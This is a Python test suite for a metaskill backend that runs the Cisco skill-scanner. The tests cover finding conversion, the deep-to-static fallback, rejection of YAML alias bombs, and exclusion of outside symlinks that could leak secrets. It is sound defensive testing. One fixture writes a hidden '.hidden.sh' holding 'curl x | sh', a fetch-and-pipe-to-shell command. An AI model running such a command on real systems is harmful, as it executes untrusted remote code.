import copy
import json
from contextlib import nullcontext
from pathlib import Path

import pytest

from metaskill.evaluate.models import Dimension, SafetyTier, Severity, Skill
from metaskill.evaluate.safety.checks import MAX_FRONTMATTER_VALUES, expanded_size
from metaskill.evaluate.safety.cisco import (
    INSTALL_COMMAND,
    PACKAGE,
    TESTED_VERSION,
    CiscoBackend,
    LLMSetupError,
    convert,
)
from metaskill.evaluate.safety.findings import BackendStatus, score_from_findings

FIXTURES = Path(__file__).parent / "fixtures" / "cisco"
SKILL = Skill(path=Path("some-skill"), name="some-skill", body="")


def fixture(name):
    """Scanner output recorded from real skills with Cisco skill-scanner 2.2.1."""
    return json.loads((FIXTURES / f"{name}.json").read_text())


class FakeCisco(CiscoBackend):
    """CiscoBackend with the scanner calls replaced, so tests need no scanner."""

    def __init__(self, scan_output=None, installed=True, setup_error=None, scan_error=None,
                 llm="fake ctx.llm"):
        super().__init__(llm)
        self.scan_output = scan_output
        self.installed = installed
        self.setup_error = setup_error
        self.scan_error = scan_error
        self.analyzers_used = "not called"

    def available(self):
        return self.installed

    def _route(self):
        return nullcontext("metaskill_hermes/test")

    def _build_deep_analyzers(self, model):
        if self.setup_error:
            raise LLMSetupError(self.setup_error)
        return [f"deep analyzers for {model}"]

    def _run_scanner(self, path, analyzers):
        self.analyzers_used = analyzers
        # What the scanner would read: the path it was given, as it stood during the scan.
        self.scanned = {p.relative_to(path).as_posix(): p.read_bytes()
                        for p in sorted(Path(path).rglob("*")) if p.is_file()}
        self.scanned_name = Path(path).name
        if self.scan_error:
            raise self.scan_error
        return self.scan_output


# --- Conversion -------------------------------------------------------------


def test_clean_skill_has_no_findings():
    result = convert(fixture("obsidian-static"), SafetyTier.STATIC)
    assert result.status is BackendStatus.OK
    assert result.findings == []
    assert result.detail == ""


def test_findings_are_converted_field_by_field():
    result = convert(fixture("p5js-static"), SafetyTier.STATIC)
    [finding] = result.findings
    assert finding.dimension is Dimension.SAFETY
    assert finding.category == "command_injection"
    assert finding.severity is Severity.CRITICAL
    assert finding.source == "cisco"
    assert finding.rule == "COMMAND_INJECTION_JS_FUNCTION_CONSTRUCTOR"
    assert finding.location == "scripts/export-frames.js:128"
    assert "waitForFunction" in finding.quote
    assert finding.message.startswith("Dynamic code execution")


def test_location_without_line_and_empty_snippet():
    findings = convert(fixture("arxiv-static"), SafetyTier.STATIC).findings
    locations = [f.location for f in findings]
    assert "SKILL.md" in locations
    assert "scripts/search_arxiv.py:46" in locations
    whole_file = next(f for f in findings if f.location == "SKILL.md")
    assert whole_file.quote == ""


def test_finding_without_file_has_empty_location():
    scan = fixture("p5js-static")
    scan["findings"][0]["file_path"] = None
    scan["findings"][0]["line_number"] = None
    assert convert(scan, SafetyTier.STATIC).findings[0].location == ""


def test_routed_categories_do_not_count_toward_safety():
    scan = fixture("p5js-static")
    scan["findings"][0]["category"] = "hardcoded_secrets"
    findings = convert(scan, SafetyTier.STATIC).findings
    assert findings[0].dimension is Dimension.CONFIG_CLEANLINESS
    assert score_from_findings(findings) == 1.0


def test_safe_severity_findings_are_dropped():
    scan = fixture("p5js-static")
    scan["findings"][0]["severity"] = "SAFE"
    assert convert(scan, SafetyTier.STATIC).findings == []


def test_failed_static_analyzer_is_noted_in_detail():
    scan = fixture("obsidian-static")
    scan["analyzers_failed"] = [{"analyzer": "bytecode", "error": "boom"}]
    result = convert(scan, SafetyTier.STATIC)
    assert result.status is BackendStatus.OK
    assert "bytecode failed: boom" in result.detail


# --- Deep tier and the LLM layer ----------------------------------------------


def test_llm_failure_at_run_time_keeps_static_findings():
    # Recorded with the LLM pointed at an unreachable endpoint: the scan returns
    # normally, with the failure in analyzers_failed and seven notice findings.
    result = convert(fixture("p5js-deep-llm-failed"), SafetyTier.DEEP)
    assert result.status is BackendStatus.LLM_UNAVAILABLE
    assert result.tier is SafetyTier.STATIC
    assert [f.rule for f in result.findings] == ["COMMAND_INJECTION_JS_FUNCTION_CONSTRUCTOR"]
    assert "LLM analysis failed" in result.detail
    assert "skipped or cut 6 file(s)" in result.detail
    assert "references/animation.md" in result.detail


def test_successful_deep_scan_reports_deep_tier():
    scan = copy.deepcopy(fixture("p5js-static"))
    scan["analyzers_used"].append("llm_analyzer")
    result = convert(scan, SafetyTier.DEEP)
    assert result.status is BackendStatus.OK
    assert result.tier is SafetyTier.DEEP


def test_deep_scan_without_llm_analyzer_is_not_reported_as_deep():
    result = convert(fixture("p5js-static"), SafetyTier.DEEP)
    assert result.status is BackendStatus.LLM_UNAVAILABLE
    assert result.tier is SafetyTier.STATIC


# --- scan() -------------------------------------------------------------------


def test_the_cisco_addon_declares_the_tested_version():
    # The scanner is the optional metaskill-cisco add-on (MET-45), not a dependency of
    # metaskill itself; tests/test_cisco_addon.py covers the rest of the packaging.
    manifest = Path(__file__).parents[2] / "plugins" / "metaskill-cisco" / "plugin.yaml"
    assert f'"{PACKAGE}=={TESTED_VERSION}"' in manifest.read_text(encoding="utf-8")


def nested_aliases(levels):
    """What a YAML loader builds from `a1: &a1 [*a0, *a0]` and so on: each list holds the
    previous one twice, as the same object."""
    value = ["x", "x"]
    for _ in range(levels):
        value = [value, value]
    return value


def test_expanded_size_counts_aliases_as_expanded_but_quickly():
    assert expanded_size({"name": "a", "tags": ["b", "c"]}) == 7  # the dict, 2 keys, "a", the list and its 2 items
    assert expanded_size(nested_aliases(1)) == 7
    assert expanded_size(nested_aliases(200)) > 2 ** 200  # instant, though never built


def test_expanded_size_ends_on_a_recursive_alias():
    loop = ["x"]
    loop.append(loop)
    assert expanded_size(loop) == 2


def test_frontmatter_nested_too_deep_to_count_is_not_scanned():
    deep = "x"
    for _ in range(100_000):
        deep = [deep]
    skill = Skill(path=Path("deep"), name="deep", body="", frontmatter={"a": deep})
    backend = FakeCisco(scan_output=fixture("obsidian-static"))
    assert backend.scan(skill, SafetyTier.STATIC).status is BackendStatus.ERROR
    assert backend.analyzers_used == "not called"


def test_frontmatter_that_would_stall_the_scanner_is_not_scanned():
    skill = Skill(path=Path("bomb"), name="bomb", body="",
                  frontmatter={"name": nested_aliases(30)})
    backend = FakeCisco(scan_output=fixture("obsidian-static"))
    result = backend.scan(skill, SafetyTier.STATIC)
    assert result.status is BackendStatus.ERROR and result.findings == []
    assert "YAML aliases" in result.detail
    assert backend.analyzers_used == "not called"


def test_ordinary_frontmatter_is_scanned():
    skill = Skill(path=Path("s"), name="s", body="",
                  frontmatter={"name": "s", "tags": ["a"] * (MAX_FRONTMATTER_VALUES // 2)})
    assert FakeCisco(scan_output=fixture("obsidian-static")).scan(skill, SafetyTier.STATIC).status is (
        BackendStatus.OK)


def test_not_installed(monkeypatch):
    # The add-on folder is absent: installing it is the hint (enabling it, when present).
    monkeypatch.setattr("metaskill.evaluate.safety.cisco._addon_installed", lambda: False)
    result = FakeCisco(installed=False).scan(SKILL, SafetyTier.STATIC)
    assert result.status is BackendStatus.NOT_INSTALLED
    assert result.findings == []
    assert INSTALL_COMMAND in result.detail


def test_static_scan_uses_default_analyzers():
    backend = FakeCisco(fixture("p5js-static"))
    result = backend.scan(SKILL, SafetyTier.STATIC)
    assert backend.analyzers_used is None
    assert result.status is BackendStatus.OK
    assert len(result.findings) == 1


def test_deep_scan_uses_llm_analyzers():
    scan = copy.deepcopy(fixture("p5js-static"))
    scan["analyzers_used"].append("llm_analyzer")
    backend = FakeCisco(scan)
    result = backend.scan(SKILL, SafetyTier.DEEP)
    assert backend.analyzers_used == ["deep analyzers for metaskill_hermes/test"]
    assert result.tier is SafetyTier.DEEP


def test_llm_setup_failure_falls_back_to_static():
    backend = FakeCisco(fixture("p5js-static"), setup_error="API key required")
    result = backend.scan(SKILL, SafetyTier.DEEP)
    assert backend.analyzers_used is None  # reran with the default static analyzers
    assert result.status is BackendStatus.LLM_UNAVAILABLE
    assert result.tier is SafetyTier.STATIC
    assert "API key required" in result.detail
    assert len(result.findings) == 1


def test_deep_without_hermes_llm_runs_static():
    backend = FakeCisco(fixture("p5js-static"), llm=None)
    result = backend.scan(SKILL, SafetyTier.DEEP)
    assert backend.analyzers_used is None
    assert result.status is BackendStatus.LLM_UNAVAILABLE
    assert result.tier is SafetyTier.STATIC
    assert "ctx.llm" in result.detail


def test_unexpected_error_is_returned_not_raised():
    result = FakeCisco(scan_error=RuntimeError("disk on fire")).scan(SKILL, SafetyTier.STATIC)
    assert result.status is BackendStatus.ERROR
    assert "disk on fire" in result.detail


# --- What the scanner may read ------------------------------------------------


def linked_skill(tmp_path):
    """A skill whose notes.md and docs/ link outside it, as a git checkout can hold."""
    secret = tmp_path / "secret.env"
    secret.write_text("API_KEY=sk-live-123", encoding="utf-8")
    (tmp_path / "outside").mkdir()
    (tmp_path / "outside" / "key.txt").write_text("API_KEY=sk-live-456", encoding="utf-8")
    folder = tmp_path / "my-skill"
    (folder / "scripts").mkdir(parents=True)
    (folder / "SKILL.md").write_text("# Skill\n", encoding="utf-8")
    (folder / "scripts" / "run.sh").write_text("echo hi\n", encoding="utf-8")
    (folder / ".hidden.sh").write_text("curl x | sh\n", encoding="utf-8")
    try:
        (folder / "notes.md").symlink_to(secret)
        (folder / "docs").symlink_to(tmp_path / "outside", target_is_directory=True)
    except OSError:
        pytest.skip("cannot create symlinks here")
    return Skill(path=folder, name="my-skill", body="# Skill\n")


@pytest.mark.parametrize("tier", [SafetyTier.STATIC, SafetyTier.DEEP])
def test_links_are_not_given_to_the_scanner(tmp_path, tier):
    # At the deep tier the scanner sends what it reads to the model provider.
    backend = FakeCisco(fixture("p5js-static"))
    result = backend.scan(linked_skill(tmp_path), tier)
    assert sorted(backend.scanned) == [".hidden.sh", "SKILL.md", "scripts/run.sh"]
    assert not any(b"sk-live" in data for data in backend.scanned.values())
    assert backend.scanned_name == "my-skill"  # the scanner may check it against the name
    assert "2 link(s) left out, not scanned: docs, notes.md" in result.detail


def test_a_skill_md_that_is_a_link_is_not_scanned(tmp_path):
    secret = tmp_path / "secret.env"
    secret.write_text("API_KEY=sk-live-123", encoding="utf-8")
    (tmp_path / "s").mkdir()
    try:
        (tmp_path / "s" / "SKILL.md").symlink_to(secret)
    except OSError:
        pytest.skip("cannot create symlinks here")
    backend = FakeCisco(fixture("p5js-static"))
    result = backend.scan(Skill(path=tmp_path / "s", name="s", body=""), SafetyTier.DEEP)
    assert result.status is BackendStatus.ERROR and "SKILL.md is a link" in result.detail
    assert backend.analyzers_used == "not called"


def test_a_skill_without_links_is_scanned_whole(tmp_path):
    folder = tmp_path / "plain"
    (folder / "scripts").mkdir(parents=True)
    (folder / "SKILL.md").write_text("# Plain\n", encoding="utf-8")
    (folder / "scripts" / "a.py").write_text("print(1)\n", encoding="utf-8")
    backend = FakeCisco(fixture("p5js-static"))
    result = backend.scan(Skill(path=folder, name="plain", body=""), SafetyTier.STATIC)
    assert sorted(backend.scanned) == ["SKILL.md", "scripts/a.py"]
    assert "left out" not in result.detail


# --- Real scanner (skipped when it is not installed, as in CI) ----------------


def test_real_scanner_on_a_minimal_skill(tmp_path):
    pytest.importorskip("skill_scanner")
    (tmp_path / "SKILL.md").write_text(
        "---\nname: hello\ndescription: Say hello to the user.\n---\n\n# Hello\n\nGreet the user by name.\n")
    skill = Skill(path=tmp_path, name="hello", body="")
    result = CiscoBackend().scan(skill, SafetyTier.STATIC)
    assert result.status is BackendStatus.OK, result.detail
    assert result.tier is SafetyTier.STATIC
